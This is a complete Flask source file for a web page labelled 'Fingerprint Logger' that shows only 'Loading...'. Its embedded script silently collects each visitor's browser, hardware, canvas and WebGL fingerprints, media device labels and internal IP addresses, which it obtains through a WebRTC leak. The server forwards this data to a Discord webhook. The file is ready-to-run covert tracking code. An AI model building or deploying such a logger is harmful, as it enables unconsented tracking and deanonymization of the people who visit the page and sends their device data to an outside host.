import os
import json
import textwrap
import requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK")
if not DISCORD_WEBHOOK:
    raise ValueError("DISCORD_WEBHOOK environment variable not set.")

# HTML + JS client
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
  <title>Fingerprint Logger</title>
</head>
<body>
  <h1>Loading...</h1>
  <script>
    async function collectFingerprint() {
      const getMediaDevices = async () => {
        try {
          const devices = await navigator.mediaDevices.enumerateDevices();
          return devices.map(d => d.kind + ": " + d.label);
        } catch (err) {
          return ["Permission Denied"];
        }
      };

      const getWebGLInfo = () => {
        try {
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
          return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
          };
        } catch {
          return null;
        }
      };

      const getCanvasFingerprint = () => {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillText("Hello, fingerprint!", 2, 2);
        return canvas.toDataURL();
      };

      const getInternalIPs = async () => {
        return new Promise((resolve) => {
          const ips = [];
          const pc = new RTCPeerConnection({ iceServers: [] });
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = e => {
            if (!e || !e.candidate) return resolve([...new Set(ips)]);
            const ipMatch = e.candidate.candidate.match(
              /([0-9]{1,3}(\.[0-9]{1,3}){3})/
            );
            if (ipMatch) ips.push(ipMatch[1]);
          };
        });
      };

      const data = {
        platform: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language
        },
        time: {
          zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          offset: new Date().getTimezoneOffset()
        },
        screen: {
          width: screen.width,
          height: screen.height,
          colorDepth: screen.colorDepth,
          pixelRatio: window.devicePixelRatio
        },
        hardware: {
          cores: navigator.hardwareConcurrency || "unknown",
          memory: navigator.deviceMemory || "unknown"
        },
        canvas: getCanvasFingerprint(),
        webgl: getWebGLInfo(),
        features: {
          touch: "ontouchstart" in window,
          cookies: navigator.cookieEnabled,
          js: true
        },
        mediaDevices: await getMediaDevices(),
        internalIPs: await getInternalIPs()
      };

      await fetch("/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    }

    collectFingerprint();
  </script>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_TEMPLATE)


@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    if not data:
        return jsonify({"error": "No data received"}), 400

    msg = textwrap.dedent(f"""\
    **New Visitor Fingerprint Logged**
    🧠 **User Agent**: {data['platform'].get('userAgent')}
    💻 **Platform**: {data['platform'].get('platform')}
    🌐 **Language**: {data['platform'].get('language')}

    ⏱ **Timezone**: {data['time'].get('zone')} (Offset: {data['time'].get('offset')})
    🖥 **Screen**: {data['screen'].get('width')}x{data['screen'].get('height')}
    🎨 **Color Depth**: {data['screen'].get('colorDepth')}, Pixel Ratio: {data['screen'].get('pixelRatio')}

    🧮 **Cores**: {data['hardware'].get('cores')}
    🧠 **RAM**: {data['hardware'].get('memory')} GB

    🧬 **WebGL Vendor**: {data['webgl'].get('vendor') if data.get('webgl') else 'N/A'}
    🎮 **WebGL Renderer**: {data['webgl'].get('renderer') if data.get('webgl') else 'N/A'}

    🎨 **Canvas Fingerprint**: {data.get('canvas')[:60]}...

    🔌 **Media Devices**: {', '.join(data.get('mediaDevices') or ['N/A'])}
    📡 **Internal IPs**: {', '.join(data.get('internalIPs') or ['N/A'])}
    """)

    try:
        requests.post(DISCORD_WEBHOOK, json={"content": msg})
        return jsonify({"status": "sent"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run(debug=True)
